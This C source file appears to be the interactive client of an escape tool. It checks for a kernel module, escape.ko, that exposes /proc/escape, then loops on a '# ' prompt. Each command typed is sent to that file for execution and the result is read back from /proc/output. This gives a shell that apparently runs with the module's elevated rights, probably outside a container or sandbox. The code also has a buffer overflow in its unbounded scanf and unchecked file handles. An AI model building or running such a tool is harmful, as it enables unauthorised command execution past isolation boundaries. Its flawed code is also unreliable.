#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
 * Write a string to the /proc/escape file
 * This will be executed and the output sent to /proc/output
 */
int send_command(char *command)
{
    FILE *escape = fopen("/proc/escape", "w+");
    int fd = fileno(escape);

    /* Flush the cache for good measure */
    fprintf(escape, "%s\n", command);
    fsync(fd);

    fclose(escape);
    return 0;
}

/*
 * Open and print whatever is in /proc/output
 */
int print_output(void)
{
    FILE *output = fopen("/proc/output", "r");;
    char c;

    while( (c = fgetc(output)) != EOF )
        printf("%c",c);

    fclose(output);
    return 0;
}

/*
 * Check escape.ko has been loaded, wait for input and loop
 * sending commands to /proc/escape and printing output from
 * /proc/output
 */
int main(void)
{
    char *command;
    command = malloc(255);

    if( access("/proc/escape", F_OK) == -1 )
    {
        printf("Please run ./escape first\n");
        goto done;
    }

    /*
     * Main loop
     */
    while( 1 )
    {
        printf("# ");
        scanf(" %[^\n]", command);

        /*
         * Check for "exit" command
         */
        if ( strcmp(command, "exit") == 0 )
            goto done;

        /*
         * Send to helper functions
         * We wait in between to allow IO to flush
         */
        send_command(command);
        sleep(1);
        print_output();
    }

done:
    /*
     * Cleanup and exit
     */
    free(command);
    return 0;
}
